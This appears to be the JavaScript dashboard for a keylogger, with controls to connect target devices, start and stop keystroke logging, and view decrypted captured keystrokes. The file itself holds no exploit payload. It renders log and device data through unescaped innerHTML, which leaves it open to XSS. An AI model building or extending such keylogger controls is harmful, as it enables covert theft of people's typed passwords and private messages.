class DeviceManager {
    constructor() {
        this.devicesList = document.querySelector('.devices-list');
        this.historyOutput = document.querySelector('#history-output');
        this.updateDevices();
        this.updateHistory();
        this.updateInterval = setInterval(() => this.updateDevices(), 300000);
        
        // Add OS button listener
        const macButton = document.querySelector('.os-type-item[data-os="macos"]');
        if (macButton) {
            macButton.addEventListener('click', () => this.connectDevice('macos'));
        }
    }

    async connectDevice(osType) {
        try {
            const response = await fetch('http://localhost:5001/connect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ osType })
            });
            const data = await response.json();
            if (data.status === 'success') {
                this.updateDevices();
                // Update button state
                const button = document.querySelector(`.os-type-item[data-os="${osType}"]`);
                if (button) {
                    button.classList.add('selected');
                    button.disabled = true;
                }
            }
        } catch (error) {
            console.error('Error connecting device:', error);
        }
    }

    async updateDevices() {
        try {
            const response = await fetch('http://localhost:5001/devices');
            const data = await response.json();
            this.renderDevices(data.devices);
        } catch (error) {
            console.error('Error fetching devices:', error);
            this.devicesList.innerHTML = '<p>Error loading devices</p>';
        }
    }

    async toggleLogging(deviceId, action) {
        try {
            const response = await fetch(`http://localhost:5001/${action}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ deviceId })
            });
            const data = await response.json();
            await this.updateDevices();
            return data;
        } catch (error) {
            console.error(`Error ${action} logging:`, error);
        }
    }

    formatLogData(logs) {
        if (!logs) return 'No logs available';
        
        // Basic formatting for readability
        const formattedLogs = logs
            .replace(/\[←\]/g, '⌫')
            .replace(/\[→\]/g, '→')
            .replace(/\[↑\]/g, '↑')
            .replace(/\[↓\]/g, '↓')
            .replace(/\[CAPS\]/g, '⇪')
            .replace(/\n/g, '\n');

        return `<div class="log-content">${formattedLogs}</div>`;
    }

    async viewLogs(deviceId, button) {
        try {
            const logOutput = document.querySelector(`#logs-${deviceId}`);
            const isDecrypted = button.dataset.decrypted === 'true';
            
            logOutput.innerHTML = 'Loading logs...';
            button.disabled = true;
            
            const endpoint = isDecrypted ? 'logs' : 'logs/decrypted';
            const response = await fetch(`http://localhost:5001/${endpoint}/${deviceId}`);
            const data = await response.json();
            
            logOutput.innerHTML = this.formatLogData(data.logs);
            
            button.textContent = isDecrypted ? 'View Decrypted Logs' : 'View Encrypted Logs';
            button.dataset.decrypted = !isDecrypted;
            button.disabled = false;
        } catch (error) {
            console.error('Error fetching logs:', error);
            logOutput.innerHTML = 'Error loading logs';
            logOutput.disabled = false;
        }
    }

    async updateHistory() {
        try {
            const response = await fetch('http://localhost:5001/history');
            const data = await response.json();
            this.renderHistory(data.history);
        } catch (error) {
            console.error('Error fetching history:', error);
            this.historyOutput.innerHTML = '<p>Error loading history</p>';
        }
    }

    renderHistory(history) {
        this.historyOutput.innerHTML = '';
        
        if (history.length === 0) {
            this.historyOutput.innerHTML = '<p>No history available</p>';
            return;
        }

        history.forEach((entry, index) => {
            const historyElement = document.createElement('div');
            historyElement.className = 'history-entry';
            
            // Create header
            const header = document.createElement('div');
            header.className = 'history-header';
            header.innerHTML = `
                <div class="history-summary">
                    <span class="history-date">${entry.date}</span>
                    <span class="history-device">ID: ${entry.deviceId}</span>
                </div>
                <span class="history-toggle">▼</span>
            `;

            // Create content
            const content = document.createElement('div');
            content.className = 'history-content';
            content.style.display = 'none';  // Initially hidden
            content.innerHTML = `<pre>${entry.content}</pre>`;

            // Add click handler
            header.onclick = function() {
                const isVisible = content.style.display === 'block';
                content.style.display = isVisible ? 'none' : 'block';
                this.querySelector('.history-toggle').style.transform = 
                    isVisible ? 'rotate(0)' : 'rotate(180deg)';
            };

            // Append elements
            historyElement.appendChild(header);
            historyElement.appendChild(content);
            this.historyOutput.appendChild(historyElement);
        });
    }

    async deactivateDevice(deviceId) {
        try {
            const response = await fetch(`http://localhost:5001/deactivate`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ deviceId })
            });
            const data = await response.json();
            if (data.status === 'success') {
                // Re-enable OS button
                const button = document.querySelector('.os-type-item.selected');
                if (button) {
                    button.classList.remove('selected');
                    button.disabled = false;
                }
                await this.updateDevices();
                await this.updateHistory();
            }
            return data;
        } catch (error) {
            console.error('Error deactivating device:', error);
        }
    }

    renderDevices(devices) {
        this.devicesList.innerHTML = '';
        
        if (devices.length === 0) {
            this.devicesList.innerHTML = '<p>No devices connected</p>';
            return;
        }

        devices.forEach(device => {
            const deviceElement = document.createElement('div');
            deviceElement.className = 'device-item';
            deviceElement.innerHTML = `
                <div class="device-info">
                    <span class="device-name">${device.name}</span>
                    <span class="device-id">ID: ${device.id}</span>
                    <span class="device-status ${device.status}">${device.status}</span>
                </div>
                <div class="device-details">
                    <span>OS: ${device.os}</span>
                    <span>Last Active: ${device.lastActive}</span>
                </div>
                <div class="device-controls">
                    <button onclick="deviceManager.toggleLogging('${device.id}', 'start')" 
                            class="control-btn start-btn" 
                            ${device.status === 'active' ? 'disabled' : ''}>
                        Start Logging
                    </button>
                    <button onclick="deviceManager.toggleLogging('${device.id}', 'stop')" 
                            class="control-btn stop-btn"
                            ${device.status === 'inactive' ? 'disabled' : ''}>
                        Stop Logging
                    </button>
                    <button onclick="deviceManager.viewLogs('${device.id}', this)" 
                            class="control-btn view-btn"
                            data-decrypted="false">
                        View Decrypted Logs
                    </button>
                    <button onclick="deviceManager.deactivateDevice('${device.id}')" 
                            class="control-btn deactivate-btn">
                        Deactivate Device
                    </button>
                </div>
                <div class="device-logs">
                    <pre id="logs-${device.id}" class="logs-output"></pre>
                </div>
            `;
            this.devicesList.appendChild(deviceElement);
        });
    }
}

// Make deviceManager globally accessible
window.deviceManager = null;

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.deviceManager = new DeviceManager();
}); 